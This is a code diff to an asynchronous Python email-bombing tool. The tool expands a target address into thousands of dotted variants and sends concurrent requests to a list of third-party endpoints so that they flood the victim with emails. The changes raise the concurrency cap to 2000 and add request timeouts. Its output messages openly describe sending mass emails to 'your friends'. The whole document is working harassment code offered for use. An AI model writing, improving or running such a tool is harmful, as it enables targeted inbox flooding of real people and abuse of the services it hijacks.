@@ -1,15 +1,16 @@
-import asyncio, aiohttp, time, re, random, string, itertools, os, json
+import asyncio, aiohttp, time, re, random, string, itertools, os, json, math
 
 # CONFIG ^_^
 size = 500 # threads per iteration
-cap = 500  # thread limit / set to None for unlimited (i do NOT recommend higher than 500)
+cap = 2000  # thread limit / set to None for unlimited (i do NOT recommend higher than 500)
+timeout_time = 30 # i dont fucking know what to set this to, i used this for testing
 
 # skidded from chatgpt
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
 
-    funnylimit = 2000 - 1 # -1 cuz i felt like it
+    funnylimit = 3999
 
     for i in range(1, len(username)):
         if len(variants) >= funnylimit:
@@ -21,23 +22,19 @@ def generate_email_variants(email):
             for index in reversed(combo):
                 if len(variants) >= funnylimit:
                     break
-                variant = variant[:index] + '.' + variant[index:]
+                variant = variant[:index] + "." + variant[index:]
             variants.append(variant)
 
-    results = [email] + list(
-        sorted(dict.fromkeys([variant + "@" + domain
-                              for variant in variants])))
+    data = list(sorted(dict.fromkeys([variant + "@" + domain for variant in variants])))
+    results = [email] + random.sample(data, k=clamp(math.ceil(math.sqrt(len(data))*10), 1, len(data)))
     return results
 
 
-# skidded from a weird guy 
 def generate_username(length: int = 5):
-    min_lc = ord('a')
-    len_lc = 26
     ba = bytearray(os.urandom(length))
     for i, b in enumerate(ba):
-        ba[i] = min_lc + b % len_lc
-    return str(time.time()).replace(".", "") + ba.decode('ascii')
+        ba[i] = ord("a") + b % 26
+    return str(time.time()).replace(".", "") + ba.decode("ascii")
 
 
 # skidded from regex ^_^
@@ -71,7 +68,7 @@ def update_progress():
 status_codes = {}
 working = []
 
-async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None):
+async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None, testing: bool = False):
     def fix(lol):
         try:
             required = isinstance(lol, (dict, tuple, list))
@@ -103,7 +100,8 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None
             params=params,
             data=data,
             headers=headers,
-            cookies=cookies
+            cookies=cookies,
+            timeout=aiohttp.ClientTimeout(total=timeout_time if not testing else 5)
         ) as resp:
             status = resp.status
             evaluation = "FAILURE" if status >= 400 else "SUCCESS"
@@ -135,8 +133,7 @@ async def main():
     ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
     ░                                                                                                                                                 
         """)
-    timeout = aiohttp.ClientTimeout(total=10)
-    async with aiohttp.ClientSession(timeout=timeout) as session:
+    async with aiohttp.ClientSession() as session:
         directory = os.path.dirname(__file__)
         try:
             with open(os.path.join(directory, "functions.json"), "r") as file:
@@ -163,13 +160,13 @@ async def main():
 
         variants = generate_email_variants(email)
         threads = None
-        print("(i do NOT recommend more than 500 threads for your computer's sake)")
+        print("(for your computer's sake I have lowered the thread limit)")
         while True:
             try:
                 limit = clamp(len(variants), 1, cap or float("inf"))
                 threads = input(f"threads per batch (1-{limit}): ")
                 if threads == "":
-                    threads = limit
+                    threads = 500
                 threads = clamp(int(threads), 1, limit)
                 break
             except:
@@ -196,7 +193,7 @@ async def main():
                 functions = dict([next(reversed(functions.items()))])
         else:
             print("pretesting endpoints to grant 2 minutes of life ♥ ♥ ♡")
-            test_tasks = [asyncio.create_task(fetch(session, email, values, name)) for name, values in functions.items()]
+            test_tasks = [asyncio.create_task(fetch(session, email, values, name, True)) for name, values in functions.items()]
             total = len(test_tasks)
             for j in range(0, len(test_tasks), size):
                 try: await asyncio.gather(*test_tasks[j:j+size])
@@ -212,7 +209,7 @@ async def main():
         print("🧵 initializing threads...")
         start = time.time()
         tasks = [asyncio.create_task(fetch(session, sub, values, name)) for sub in variants for name, values in functions.items()]
-        print("sending some cute emails to your friends")
+        print("sending cute emails to your friends")
         for j in range(0, len(tasks), size):
             try: await asyncio.gather(*tasks[j:j+size])
             except Exception: pass
@@ -221,7 +218,7 @@ async def main():
             file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
         taken = time.time() - start
         minutes, seconds = int(taken // 60), int(taken % 60)
-        print(f"🤣 attempted to send {total:,} emails in {minutes}:{seconds:02}")
+        print(f"attempted to send {total:,} emails in {minutes}:{seconds:02}")
         print("remember that some emails will be delayed or never arrive")
         async with session.get("https://raw.githack.com/Inkthirsty/cute-email-spammer/main/adjectives.json") as resp:
             words = ", ".join(random.sample(await resp.json(), k=5))
